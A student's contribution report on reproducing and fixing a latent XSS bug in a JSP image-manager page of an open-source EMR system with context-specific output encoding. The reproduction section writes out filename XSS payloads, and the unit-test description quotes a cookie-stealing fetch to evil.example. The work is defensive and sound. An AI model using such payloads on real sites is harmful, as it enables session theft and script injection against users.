
# Contribution [1]: [Security] RLinV1 XSS defense-in-depth — image filename unencoded in eform/efmimagemanager.jsp (claude assist)

**Contribution Number:** [1]  
**Student:** [Raymond Lin]  
**Issue:** [GitHub issue link](https://github.com/carlos-emr/carlos/issues/2316)  
**Status:** Phase I — Completed · Phase II — Completed · Phase III — Completed · Phase IV — Completed

---

## Why I Chose This Issue
I'm working with the issue [Security] XSS defense-in-depth — image filename unencoded in eform/efmimagemanager.jsp (claude assist) because it aligns with my cybersecurity and frontend experience. The issue is a low severity and is a good starter issue and has a clear criteria on what to fix and a sugguested fix. 

I'm interested in this since it works with XSS which is a harmful cyberattack that malicious attackers can do and 
compromise security systems due to running external code. I've previously taken a security fundamentals class and have
taken a certification from SANS which went over XSS attacks and how to mitage these attacks. The issue  doesn't seem to 
difficult to fix and I understand the current issue is regarding the filename input.

I hope to learn more about open source contribution and how to work in mitaging XSS on real world codebases.

---

## Understanding the Issue

### Problem Description
The problem is that the page outputs user input data that could be intereperted as code. This enables XSS since it allows
user to input javascript code without the code being encoded first to be harmless

### Expected Behavior
Filenames should be encoded at the point of output before being rendered into HTML attributes and JavaScript strings, regardless of what upstream validation has already done.

title="<%=curimage%>" → should use HTML attribute encoding
showImage('<%=fileURL%>', ...) → should use JavaScript encoding
><%=curimage%> → should use HTML body encoding

### Current Behavior

In `efmimagemanager.jsp`, `curimage` (the image filename) is written into the page in three places without encoding:

- **Line 100** — HTML `title` attribute: `<td title="<%=curimage%>">` — a filename containing `"` could break out of the attribute.
- **Line 102** — JavaScript `onclick` string: `onclick="showImage('<%=fileURL%>', ...)"` — `fileURL` embeds the raw filename; a `'` or `)` in the name could close the JS string and inject code.
- **Line 102** — HTML link text: `><%=curimage%></a>` — filename rendered as raw HTML content.

Upload validation in `PathValidationUtils.validateFileName()` currently restricts filenames to `[a-zA-Z0-9._]`, so no exploit is possible today. However this is a single point of defense: if validation is ever weakened, bypassed, or a new upload path is added without the same check, all three locations become live XSS sinks. Line 107 (the delete link) already applies `<carlos:encode context="javaScriptAttribute">` correctly and is the reference pattern.

### Affected Components

- **Primary file:** `src/main/webapp/WEB-INF/jsp/eform/efmimagemanager.jsp` — lines 100 and 102 are the unencoded output points; line 107 is the correctly-encoded model to follow.
- **Data source:** `io.github.carlos_emr.carlos.eform.EFormUtil#listImages()` — supplies the raw filename strings rendered on the page.
- **Encoding infrastructure:** the `SafeEncode` utility class — the project's null-safe, OWASP-backed wrapper that must be applied at the unencoded output locations. (The `<carlos:encode>` JSP tag is an alternative wrapper around the same encoder, but the repo's CI lint mandates `SafeEncode` and bans raw OWASP `Encode.*`.)

---

## Reproduction Process

### Environment Setup

The CARLOS EMR project uses a Docker-based devcontainer. Here is how I set up the local development environment.

**Prerequisites**
- Docker Desktop (installed and running)
- VS Code with the "Dev Containers" extension by Microsoft
- Git

**Steps**

1. Clone the repository and open it in VS Code:
   ```bash
   git clone https://github.com/carlos-emr/carlos.git
   cd carlos
   code ./
   ```

2. VS Code detects the `.devcontainer` folder and prompts "Reopen in Container" — click it. If the prompt does not appear, click the green remote-connection icon (bottom-left of VS Code) and select "Reopen in Container".

3. Wait for the container to finish building. On first run this takes several minutes; the application container waits for a database health check before starting.

4. Compile the project inside the container:
   ```bash
   make clean
   make install
   ```
   First-time compilation can take a long time (~8 min on Windows) due to Maven downloading dependencies. Subsequent builds are faster.

5. Access the app at `http://localhost:8080/carlos`.
   - Username: `carlosdoc` / Password: `carlos2026` / PIN: `2026`
   - On first login you are forced to reset the password — use the same credentials to complete it.

**Challenges faced**
- App intially failed with make install but a rerun of make install worked.
- App also took well over 2 hours in my local machine to start and requires patience
<img width="872" height="211" alt="image" src="https://github.com/user-attachments/assets/5f324c6c-37c3-4dc8-aa6e-c3ba08997de5" />


### Steps to Reproduce

The upload path sanitizes filenames (`PathValidationUtils.validateFileName()` strips everything outside `[a-zA-Z0-9._]`), so a malicious name can't get in through the UI. The actual vulnerable code is the **rendering layer**, so I exercised it directly by placing malicious-named files on disk in the directory the running app reads. `EFormUtil.listImages()` simply calls `dir.list()` — no extension or content filter — so whatever filename sits there is passed straight into `efmimagemanager.jsp` and rendered. That is the code path being attacked.

> **One real constraint:** Linux filenames cannot contain `/`, so the issue's original `');alert(1);//.jpg` payload is **impossible to create** (the `//` makes `touch` fail). Every payload below is deliberately `/`-free.

1. Start the devcontainer / app and confirm you can reach `http://localhost:8080/carlos`.

2. In the container terminal, create the eform image directory and plant three malicious filenames — one crafted for each output sink. The directory comes from the live config (`/root/carlos.properties` → `EFORM_IMAGES_DIR=/var/lib/OscarDocument/oscar/eform/images/`) and starts empty:
   ```bash
   mkdir -p /var/lib/OscarDocument/oscar/eform/images
   # Payload A — breaks out of the title="" attribute (line 100), fires on hover:
   touch '/var/lib/OscarDocument/oscar/eform/images/x" onmouseover="alert(document.domain).png'
   # Payload B — breaks out of the onclick showImage('...') JS string (line 102), fires on click:
   touch "/var/lib/OscarDocument/oscar/eform/images/'+alert(document.domain)+'.png"
   # Payload C — injected into the link text / HTML body (line 102), fires automatically on page render:
   touch '/var/lib/OscarDocument/oscar/eform/images/<img src=x onerror=alert(document.domain)>.png'
   ```

3. In the browser, log in (`carlosdoc` / `carlos2026` / PIN `2026`) and navigate directly to the image manager:
   ```
   http://localhost:8080/carlos/eform/efmimagemanager
   ```

4. All three files appear in the image table. Trigger each sink:
   - **Hover** the `x" onmouseover=...` row → an `alert(document.domain)` pops — confirms the unencoded **`title` attribute** sink (line 100).
   - **Click** the `'+alert(document.domain)+'.png` filename link → an `alert(document.domain)` pops — confirms the unencoded **`onclick` JavaScript string** sink (line 102).
   - **No interaction needed** for the `<img src=x onerror=...>.png` row → the injected `<img>` tag tries to load `src=x`, fails, and its `onerror` fires `alert(document.domain)` automatically on page render — confirms the unencoded **HTML link-text / body** sink (line 102).

5. (Optional) Right-click → View Page Source and search for the filenames to see the raw, unencoded payloads written straight into the HTML.

If all three alerts fire, issue #2316 is reproduced. If the rows appear but the alerts do **not** fire, the filesystem may have altered the filenames (e.g. stripped quotes) — inspect the names as actually listed and adjust the payloads accordingly.

### Reproduction Evidence

**Demo video** — reproduction of all three sinks and the post-fix behavior:

https://github.com/user-attachments/assets/7f700d29-ea0c-41a5-959d-aae0c0a7614f

- **Working branch (fork):** https://github.com/RLinV1/carlos/tree/fix-issue-2316
- **Screenshots/logs:** ![This alert happens when clicking on the image](image-1.png)
![This error happens on hover over](image-2.png)

- **My findings:**
  - The vulnerability reproduces **consistently** — all three planted payloads fired their `alert(document.domain)` every time the image manager page was loaded, not just once. This is live JavaScript execution, not merely raw text appearing in the page source.
  - **Three distinct sinks confirmed by actual code execution:**
    - **Line 100, `title` attribute** (`<td title="<%=curimage%>">`). Payload `x" onmouseover="alert(document.domain).png`: the `"` closes the `title` attribute early so the rest becomes a new attribute — `<td title="x" onmouseover="alert(document.domain).png">` — and hovering the cell fires the injected `onmouseover` → a clean `alert(document.domain)`, no navigation. **Trigger: hover.**
    - **Line 102, `onclick` JS string** (`onclick="showImage('<%=fileURL%>', ...)"`, where `fileURL = contextPath + "/eform/displayImage?imagefile=" + filename`). Payload `'+alert(document.domain)+'.png`: the `'+` closes the JS string mid-URL so the alert runs while the argument is being built — `showImage('/carlos/eform/displayImage?imagefile=' + alert(document.domain) + '.png', 'image0'); return false;` — and the trailing `+ '.png'` cleanly absorbs the rest of the template so the statement stays syntactically valid. **Trigger: click.**
    - **Line 102, HTML link text / body** (`><%=curimage%></a>`). Payload `<img src=x onerror=alert(document.domain)>.png`: the filename is written into the page body verbatim, so it becomes a **brand-new `<img>` tag** rather than text. The browser tries to fetch `src=x`, that load fails, and the element's `onerror` handler runs the JS. **Trigger: automatic on page render — no user interaction.** (A `<svg onload=...>` payload achieves the same via the load event instead of error.)
  - **Constraint discovered:** Linux filenames cannot contain `/`, so the issue's original `');alert(1);//.jpg` payload is impossible to create (`touch` fails). All three working payloads are `/`-free — the `onclick` one swaps the `//` comment trick for `+ '.png'` concatenation to stay valid.
  - **Expected behavior:** the filename should be context-encoded at output — the `"` HTML-attribute-encoded inside `title`, the `'` JavaScript-escaped inside the `onclick` string, and the `<`/`>` HTML-body-encoded in the link text — so none can break out of its surrounding context.
  - **Actual behavior:** the raw filename is written verbatim into all three contexts, so attacker-controlled characters become live HTML/JS and the alerts execute.
  - **Key insight:** the bug is **only** latent in normal use because `PathValidationUtils.validateFileName()` strips everything outside `[a-zA-Z0-9._]` at upload time, and `EFormUtil.listImages()` applies no filter of its own (just `dir.list()`). Reproduction required planting the files **directly on the filesystem** (`/var/lib/OscarDocument/oscar/eform/images/`) to bypass that single input filter — which is exactly why the issue is framed as *defense-in-depth*: the rendering layer trusts upstream sanitization that could be weakened, bypassed, or skipped by a future upload path.
  - **Reference pattern confirmed:** line 107's `deleteImg()` call already wraps `curimage` in `<carlos:encode context="javaScriptAttribute">`, so a malicious filename renders **safely** there in the same page — proving the fix pattern works and the other sinks are simply inconsistent omissions.

---

## Solution Approach

### Analysis

**Root cause.** JSP `<%= ... %>` expression scriptlets perform **no output encoding** — whatever string they evaluate is written to the response byte-for-byte. In `efmimagemanager.jsp`, the image filename (`curimage`, and `fileURL` which is built from it) is emitted through three such raw expressions:

- **Line 100** — `<td title="<%=curimage%>">` → HTML attribute context, no encoding.
- **Line 102** — `onclick="showImage('<%=fileURL%>', ...)"` → JavaScript-string-inside-HTML-attribute context, no encoding.
- **Line 102** — `><%=curimage%></a>` → HTML body/text context, no encoding.

The data originates from `EFormUtil#listImages()`, which simply lists filenames on disk and does not encode them. So the responsibility for safe output is never met anywhere in the chain. The reason no exploit fires today is a *single* upstream control — `PathValidationUtils.validateFileName()` restricting filenames to `[a-zA-Z0-9._]`. That is input sanitization, not output encoding, and relying on it alone violates defense-in-depth: one removed/weakened/bypassed filter (or a new upload path that forgets the check) turns all three lines into live XSS sinks.

### Proposed Solution

Apply **context-specific output encoding at the point of output** for each filename sink, using the project's null-safe `SafeEncode` utility in scriptlet form (`<%= SafeEncode.forXxx(...) %>`), with the method matching where the value lands. This adds one import at the top of the JSP (`<%@ page import="io.github.carlos_emr.carlos.utility.SafeEncode" %>`). No change to validation, the data layer, or behavior for legitimate filenames — a pure hardening change. Four filename outputs are encoded:

| Sink (line) | Output context | Method used |
|-------------|----------------|-------------|
| `title="…"` (100) | HTML attribute | `SafeEncode.forHtmlAttribute(curimage)` |
| `showImage('…')` in `onclick` (102) | JS string inside an HTML attribute | `SafeEncode.forJavaScriptAttribute(fileURL)` |
| link text between `<a>…</a>` (102) | HTML body | `SafeEncode.forHtmlContent(curimage)` |
| `deleteImg('…')` in `onclick` (107) | JS string inside an HTML attribute | `SafeEncode.forJavaScriptAttribute(curimage)` |

Encoding result: `"` → `&#34;`, `</>` → `&lt;/&gt;`, `'` → `\x27` — so no payload can escape its context.

**Why `SafeEncode` scriptlets** (over raw OWASP `Encode.*` and over `<carlos:encode>` tags): raw `Encode.*` is banned by the repo's CI lint (`check-encoder-null-safety.sh`) because `Encode.forXxx(null)` renders the literal string `"null"`; `SafeEncode` is the mandated null-safe wrapper. In scriptlet form it fits this scriptlet-heavy JSP and avoids nested-quote clutter. The three vulnerable sinks (lines 100/102) are newly encoded; `deleteImg` (107) was already encoded and is converted to `SafeEncode` so all four filename outputs use one consistent encoder.

### Implementation Plan

Using UMPIRE framework (adapted):

**Understand:** A user-controlled image filename is written into an HTML attribute, a JavaScript string, and HTML body text in `efmimagemanager.jsp` without output encoding. Only upstream filename sanitization prevents XSS today. The filename should be context-encoded at output so the page is safe even if that single upstream control fails.

**Match:** Line 107 of the **same file** (`deleteImg()`) was the only filename output already being encoded, so it established that encoding belongs at these sinks. For the encoder itself, the project mandates the null-safe `SafeEncode` utility (`io.github.carlos_emr.carlos.utility.SafeEncode`), a wrapper around OWASP Encoder; raw `Encode.*` is banned by CI lint. I mirrored that existing precedent and standardized all four filename outputs on `SafeEncode`.

**Plan:**
1. In `src/main/webapp/WEB-INF/jsp/eform/efmimagemanager.jsp`, add `<%@ page import="io.github.carlos_emr.carlos.utility.SafeEncode" %>` at the top.
2. **Line 100** `title`: `title="<%= SafeEncode.forHtmlAttribute(curimage) %>"`.
3. **Line 102** `fileURL` in `showImage(...)` `onclick`: `SafeEncode.forJavaScriptAttribute(fileURL)`.
4. **Line 102** link-text `curimage`: `SafeEncode.forHtmlContent(curimage)`.
5. **Line 107** `deleteImg(...)` `onclick`: convert to `SafeEncode.forJavaScriptAttribute(curimage)` for a single consistent encoder.
6. Leave `PathValidationUtils` and `EFormUtil` untouched — the fix is intentionally scoped to the output layer (one logical change per PR, per CONTRIBUTING.md).

> **Build note:** Because this change touches **only the JSP**, no full rebuild is required. The project's **hot reload** (set up automatically by `make install`, and running in the background after the first build) picks up JSP/HTML/CSS edits — saving the file and refreshing the page in the browser shows the change. A full `make clean && make install` is only needed for changes to non-hot-reloadable file types (e.g. Java source). This made the edit-and-verify loop fast: edit `efmimagemanager.jsp` → refresh the image manager → re-check the payloads.

**Implement:** Implemented on branch `fix-issue-2316` of fork `RLinV1/carlos`, targeting the upstream **`develop`** branch (per CONTRIBUTING.md — never `main`). Committed with a Conventional Commits + DCO-signed message (`fix: encode eform image filenames in efmimagemanager.jsp to prevent XSS (fixes carlos-emr#2316)`) and submitted as PR [#2896](https://github.com/carlos-emr/carlos/pull/2896). See [Implementation Notes](#implementation-notes) for the full diff summary.

**Review:** Self-review checklist against CONTRIBUTING.md:
- [x] Uses the OWASP-backed, null-safe `SafeEncode` utility (mandatory security guideline; raw `Encode.*` is CI-banned) rather than hand-rolled escaping.
- [x] One focused logical change; no unrelated edits; existing copyright header retained.
- [x] Commit follows Conventional Commits (`fix:`) **and** is DCO-signed (`-s`).
- [x] PR targets `develop`, references the issue (`fixes #2316`), and explains the defense-in-depth rationale.
- [x] Behavior for valid `[a-zA-Z0-9._]` filenames is unchanged (encoders are no-ops on safe characters).

**Evaluate:** See Testing Strategy below — manual before/after reproduction with the malicious filename, plus a JUnit 5 encoding assertion to lock the behavior in.


---

## Testing Strategy

### Unit Tests

Three JUnit tests in `EformImageFilenameEncodingUnitTest.java` lock in the encoding contract — one per sink/context. Payloads are deliberately different from the ones used in manual reproduction, to widen coverage:

- [x] **Test case 1 — `htmlAttribute` context (line 100, `title`):** encoding `"><script>alert(1)</script>` with `SafeEncode.forHtmlAttribute()` escapes both the `"` (→ `&#34;`) and the `<` (→ `&lt;`), so a filename can neither close the `title=""` attribute nor open a new tag.
- [x] **Test case 2 — `javaScriptAttribute` context (line 102, `onclick`):** encoding `';fetch('//evil.example/?c='+document.cookie);//` with `SafeEncode.forJavaScriptAttribute()` escapes the single quote to `\x27`, so the payload can't close the `showImage('…')` JS string and run injected statements.
- [x] **Test case 3 — `html` context (line 102, link text):** encoding `<svg onload=alert(document.domain)>` with `SafeEncode.forHtmlContent()` escapes `<`/`>` (→ `&lt;`/`&gt;`), so no real element is injected into the page body.

**How to run them** (from the repo root inside the container):
```bash
cd /workspace
mvn -o test -Dtest=EformImageFilenameEncodingUnitTest
```
- `mvn test` — compiles the code, then runs the matching tests.
- `-o` — offline mode; skips checking the internet for dependency updates so it starts faster.
- `-Dtest=EformImageFilenameEncodingUnitTest` — runs only this test class instead of the whole suite.

Expected output near the end:
```
Tests run: 3, Failures: 0, Errors: 0, Skipped: 0
[INFO] BUILD SUCCESS
```
`Failures: 0` means the encoding behaves correctly; a failure prints the expected-vs-actual assertion pointing at the exact line. (On this WSL/9p filesystem the compile step takes a few minutes — that's the environment, not the tests; the 3 tests themselves run in milliseconds.) Other run options: `mvn -o test -Dgroups="encoding"` or `-Dgroups="security"` run everything with those tags, and `make install --run-unit-tests` builds and runs the whole unit-test suite.

### Integration Tests

**Not applicable for this fix — verification is end-to-end/browser instead.** In this project, JUnit integration tests extend `CarlosTestBase` (Spring context + H2 in-memory database) and exercise the DAO / Manager / DB layers; they do not render JSPs. This change lives entirely in the JSP **view layer** (output encoding of a string), so there's no database or service behavior for a `CarlosTestBase` test to assert against — forcing one would be testing the wrong layer.

The real "everything connected" coverage for a JSP/XSS fix is **end-to-end in a browser**, which is exactly the [Manual Testing](#manual-testing) below (load the page, confirm no alert fires, confirm View Page Source shows escaped entities). The project automates this class of check with Playwright UI tests (`scripts/*-playwright*.js`); an optional automated version of scenario 1 could be modeled on those:

- **Scenario 1 (XSS blocked):** with a malicious-named file in the eform image dir, load `/carlos/eform/efmimagemanager` as a logged-in user → no alert fires on hover/click/render, and the rendered HTML shows the filename encoded (`&#34;`, `&lt;`, `\x27`).
- **Scenario 2 (no regression):** with a normal filename (e.g. `scan.png`), the Image Library still renders, the view-image link opens, and Delete works — confirming the encoding didn't break legitimate behavior.

> **Summary:** unit tests cover the encoding contract; integration is end-to-end/browser verification (manual now, optionally Playwright later), since the change is in the JSP view layer and is not exercisable through the DB-backed `CarlosTestBase` integration harness.

### Manual Testing

I verified the fix with a before/after comparison against the three planted payloads from the [Steps to Reproduce](#steps-to-reproduce). Because input sanitization blocks malicious filenames at upload, the files were placed directly on disk in `/var/lib/OscarDocument/oscar/eform/images/` to exercise the rendering layer. After editing the JSP, the project's hot reload picked up the change, so I just refreshed the image-manager page to re-test each payload.

**Before the fix (baseline — bug reproduced):** loading `http://localhost:8080/carlos/eform/efmimagemanager` with the three files present, each sink executed `alert(document.domain)`:

| # | Payload filename | Sink (line) | Trigger | Result before fix |
|---|------------------|-------------|---------|-------------------|
| A | `x" onmouseover="alert(document.domain).png` | `title` attribute (100) | hover the row | ✅ alert fired |
| B | `'+alert(document.domain)+'.png` | `onclick` JS string (102) | click the filename link | ✅ alert fired |
| C | `<img src=x onerror=alert(document.domain)>.png` | link text / HTML body (102) | automatic on page render | ✅ alert fired |

View Page Source confirmed the raw, unencoded payloads were written straight into the HTML.

**After the fix (same three files, no payload changes):** reloaded the same page and re-ran every trigger:

| # | Trigger | Result after fix |
|---|---------|-----------------|
| A | hover the row | ❌ no alert — filename shown as inert text in the `title` |
| B | click the filename link | ❌ no alert — link behaves normally |
| C | page render | ❌ no alert — no injected `<img>` tag is created |

View Page Source after the fix showed the special characters rendered as **escaped HTML entities** (e.g. `"` → `&#34;`, `'`/`<`/`>` escaped per context) instead of live markup, confirming the `SafeEncode` methods are applied at each sink.

**No regression:** a normal filename (e.g. `xray.png`) still displays correctly and the `showImage(...)` / `deleteImg(...)` buttons continue to function exactly as before.

A screen recording of the reproduction and the post-fix behavior is embedded under [Implementation Notes](#implementation-notes) and the [Reproduction Evidence](#reproduction-evidence) section.

---

## Implementation Notes

### Week 2-3 Progress

**Issue #2316 — XSS defense-in-depth in `efmimagemanager.jsp` (eForm Image Library)**

**What was built:** Added output encoding to the three previously-unencoded sinks where eForm image filenames were rendered into the page, wrapping each in the project's null-safe `SafeEncode` method appropriate to where the value lands, and standardized the already-encoded `deleteImg` sink (line 107) onto `SafeEncode` too so all four filename outputs use one consistent encoder.

**Challenges faced:**
- **Reproducing the bug required bypassing input sanitization.** `PathValidationUtils.validateFileName()` strips everything outside `[a-zA-Z0-9._]` at upload, so a malicious filename can't be uploaded through the UI. I had to plant files directly on disk (`/var/lib/OscarDocument/oscar/eform/images/`, the path the running app reads from `EFORM_IMAGES_DIR` in `/root/carlos.properties`) to exercise the rendering layer.
- **The issue's original payload (`');alert(1);//.jpg`) is impossible** — `//` contains `/`, which Linux disallows in filenames. I used `/`-free equivalents instead.
- **Slow initial build.** The workspace is on a WSL2/Windows mount, which made the first-time Maven build take a long time (~2h). Subsequent JSP edits were fast because hot reload picked them up — saving `efmimagemanager.jsp` and refreshing the page reflected the change without a rebuild.

**Decisions made:**
- Standardized all four filename outputs (including the already-encoded `deleteImg` on **line 107**) on the `SafeEncode` utility, so the whole file uses one consistent encoder rather than a mix.
- Used **context-specific methods per sink** rather than one blanket encoder, because each value lands in a different context (HTML attribute vs. JS-in-attribute vs. HTML body).
- Left `<%="image" + i%>` unencoded — it's a server-controlled loop integer, no user input.

### Week 2-3 Progress (continued)
This week I also wrote the unit tests for the fix — three JUnit 5 tests (one per encoding context) that verify the `SafeEncode` methods neutralize XSS payloads, so every filename sink is provably encoded and no XSS can occur.


### Code Changes

**Files modified:**
- `src/main/webapp/WEB-INF/jsp/eform/efmimagemanager.jsp` — added the import `<%@ page import="io.github.carlos_emr.carlos.utility.SafeEncode" %>` and wrapped each filename sink in the matching `SafeEncode` method.
- `src/test/java/io/github/carlos_emr/carlos/utility/EformImageFilenameEncodingUnitTest.java` *(new)* — three JUnit 5 unit tests pinning the encoding contract the fix relies on.

The JSP change — four filename sinks, each encoded for its output context:

| Sink (line) | Output context | Method used |
|-------------|----------------|-------------|
| `title="…"` (100) | HTML attribute | `SafeEncode.forHtmlAttribute(curimage)` |
| `showImage('…')` in `onclick` (102) | JS string inside an HTML attribute | `SafeEncode.forJavaScriptAttribute(fileURL)` |
| link text between `<a>…</a>` (102) | HTML body | `SafeEncode.forHtmlContent(curimage)` |
| `deleteImg('…')` in `onclick` (107) | JS string inside an HTML attribute | `SafeEncode.forJavaScriptAttribute(curimage)` |

Encoding result: `"` → `&#34;`, `</>` → `&lt;/&gt;`, `'` → `\x27` — so no payload can escape its context.

The new test class adds three tests (a JSP can't be unit-tested without a servlet container, so they target the `SafeEncode` methods the JSP calls), tagged `@Tag("unit")`, `@Tag("encoding")`, `@Tag("security")` with BDD naming:
- `forHtmlAttribute` neutralizes a script-tag attribute breakout (`"><script>…`)
- `forJavaScriptAttribute` neutralizes a cookie-exfil quote breakout (`';fetch(…)//` → `'` becomes `\x27`)
- `forHtmlContent` neutralizes an SVG injection (`<svg onload=…>` → `&lt;/&gt;`)

**Key commits:** Committed with the Conventional Commits message `fix: encode eform image filenames in efmimagemanager.jsp to prevent XSS (fixes carlos-emr#2316)` on branch `fix-issue-2316` of fork `RLinV1/carlos`. Submitted as PR [#2896](https://github.com/carlos-emr/carlos/pull/2896).

**Approach decisions / why:**
- **`SafeEncode` scriptlets over raw OWASP `Encode.*` and over `<carlos:encode>` tags** — raw `Encode.*` is banned by repo CI (`check-encoder-null-safety.sh`) because `Encode.forXxx(null)` renders the literal string `"null"`; `SafeEncode` is the mandated null-safe wrapper. In scriptlet form it fits this scriptlet-heavy JSP and avoids nested-quote clutter.
- **Context-specific method per sink** — each value lands in a different context (HTML attribute vs. JS-in-attribute vs. HTML body), so the matching `SafeEncode.forXxx` method is used at each.
- **Standardized all four filename outputs** on `SafeEncode`, including `deleteImg` (107), so the whole file uses one consistent encoder rather than a mix.
- **Left `<%="image" + i%>` unencoded** — it's a server-controlled loop integer, no user input.
- **Defense-in-depth framing** — not currently exploitable via the UI (upload sanitization blocks it), but the rendering layer shouldn't rely solely on upstream input filtering; classified Low severity accordingly.
- **Verification method** — reproduced all three vulnerable sinks with distinct payloads (hover/`title`, click/`onclick`, on-render `<img onerror>`/link-text), confirmed each goes silent after the fix and View Page Source shows escaped entities, and ran the 3 unit tests (`mvn test -Dtest=EformImageFilenameEncodingUnitTest` → 3 passing).



https://github.com/user-attachments/assets/9acc8059-c5c7-4f65-8e77-885b09e88793

---

## Pull Request

**PR Link:** https://github.com/carlos-emr/carlos/pull/2896

**PR Description** (as submitted):

> ## What does this PR do?
>
> Adds context-specific output encoding to the locations in `eform/efmimagemanager.jsp` where an image filename is rendered into the page, using the project's null-safe `SafeEncode` utility. This hardens the eForm Image Library against stored XSS as a defense-in-depth measure.
>
> ## Why was this PR needed?
>
> The image filename (`curimage` / `fileURL`, sourced from `EFormUtil.listImages()`) was written into three output contexts with no encoding:
> - **Line 100** — the `title=""` HTML attribute
> - **Line 102** — the `showImage('<%=fileURL%>', ...)` `onclick` JavaScript string
> - **Line 102** — the link text / HTML body
>
> Today these are not exploitable through the UI because `PathValidationUtils.validateFileName()` strips everything outside `[a-zA-Z0-9._]` at upload. But that is a single input-sanitization layer; if it is ever weakened, bypassed, or a new upload path skips it, all three locations become live XSS sinks. By planting malicious filenames directly on disk (bypassing upload validation, exercising only the render path) I confirmed all three execute `alert(document.domain)` — via hover (`title`), click (`onclick`), and automatic render (`<img onerror>` in the body). Line 107's `deleteImg()` was already encoded; this PR encodes the three vulnerable sinks with `SafeEncode` and standardizes `deleteImg` onto `SafeEncode` too, so all four filename outputs use one consistent encoder.
>
> ## What are the relevant issue numbers?
>
> Closes #2316
>
> ## Screenshots / Recordings
>
> Before/after: each payload fires an `alert` before the fix and is rendered as inert, escaped text after. (Reproduction recording and screenshots available.)
>
> ## Does this PR meet the acceptance criteria?
>
> - [x] Tests added for new/changed behavior (`EformImageFilenameEncodingUnitTest` — one per encoding context)
> - [x] All tests passing
> - [x] Follows project style guide (uses the mandated null-safe `SafeEncode` utility; Conventional Commits + DCO sign-off)
> - [x] No breaking changes introduced (legitimate filenames render and function unchanged)
> - [x] Documentation updated (if applicable) — N/A; view-layer encoding only

**Maintainer Feedback:**

No feedback from a project maintainer yet (awaiting first review on PR #2896). The feedback I acted on during development came from **AI-assisted review** (noted here as such — I reviewed and verified each point against the codebase before committing):
- I initially planned to use the `<carlos:encode>` JSP tag. AI-assisted review flagged that the repo's CI lint (`check-encoder-null-safety.sh`) bans raw OWASP `Encode.*` and that the project's mandated null-safe wrapper is the `SafeEncode` utility. Based on that, I switched to `SafeEncode` scriptlets (`<%= SafeEncode.forXxx(...) %>`) — which are also a better fit for this scriptlet-heavy JSP and avoid nested-quote clutter.
- AI-assisted review also pointed out that the `deleteImg('…')` call on **line 107** should be standardized to `SafeEncode.forJavaScriptAttribute(curimage)` along with the other sinks, so the whole file uses one consistent encoder rather than a mix. I applied that change too after confirming it matched the JS-string-in-attribute context.

**Status:** Awaiting review

---

## Learnings & Reflections

### Technical Skills Gained

- **Cross-site scripting (XSS) in practice.** I went beyond the theory I'd seen in my security fundamentals coursework and SANS training and actually reproduced a real XSS bug — crafting three different payloads that each break out of a distinct output context (HTML attribute, JavaScript string, and HTML body) and fire `alert(document.domain)` via hover, click, and automatic on-render triggers. This made the difference between *input sanitization* and *output encoding* concrete, and taught me why defense-in-depth means encoding at the point of output rather than trusting a single upstream filter.
- **Output encoding as the fix.** I learned how to apply context-specific encoding (the `SafeEncode` methods `forHtmlAttribute`, `forJavaScriptAttribute`, and `forHtmlContent`) and how to find and follow an existing, already-reviewed pattern in the codebase rather than inventing my own.
- **The open-source contribution workflow.** I learned the full process of contributing to a real project: forking, creating a working branch, reading the project's `CONTRIBUTING.md`, and following its conventions (Conventional Commits, DCO sign-off, targeting the `develop` branch, and the project's testing expectations).
- **Working inside a Docker devcontainer.** I gained hands-on experience setting up and building a large EMR codebase in a containerized dev environment, including Maven builds and JSP hot reload.

### Challenges Overcome

The hardest part was **understanding an unfamiliar, large codebase** and **reproducing the original development environment exactly** so my local setup behaved like the upstream repository. Standing up the Docker devcontainer, getting the Maven build to complete, and locating the precise code path the vulnerable filename travels (from `EFormUtil.listImages()` into `efmimagemanager.jsp`) took real patience. I worked through it by reading the project's setup docs and config carefully, retrying the build when `make install` failed the first time, and tracing the data flow line by line until I could confidently point to the exact unencoded output locations.

### What I'd Do Differently Next Time

I'd **read more of the project's documentation up front** before diving into the code — it would have saved time on both the environment setup and locating the right files. I also learned not to be impatient when working on a large codebase: builds and first-time compilation can take a long time, and pushing forward too quickly (or assuming something is broken when it's just slow) creates more problems than it solves. Next time I'll set realistic expectations for build times and let long-running steps finish.

---

## Resources Used

- **[Issue #2316](https://github.com/carlos-emr/carlos/issues/2316)** — the source issue; provided the affected file, the three unencoded sinks, the severity rationale (mitigated by upload sanitization), and the suggested context-specific fix.
- **CARLOS `CONTRIBUTING.md`** — defined the conventions I built the plan around: target the `develop` branch, DCO sign-off (`git commit -s`), Conventional Commits (`fix:`), JUnit 5 tests with BDD naming, and the mandatory use of the OWASP-backed `SafeEncode` wrapper.
- **Line 107 of `efmimagemanager.jsp` (`deleteImg()`, the one already-encoded filename output)** — the in-repo precedent showing encoding belongs at these sinks, which I followed and standardized onto `SafeEncode`.
- **[OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)** — confirmed the principle of context-specific output encoding (HTML attribute vs. JavaScript vs. HTML body) and why output encoding is the correct defense-in-depth layer over input sanitization alone.
- **[OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)** — the library the project's `SafeEncode` wrapper is built on.
- **[VS Code Dev Containers documentation](https://code.visualstudio.com/docs/devcontainers/containers)** — used to set up and troubleshoot the Docker-based devcontainer environment during reproduction.
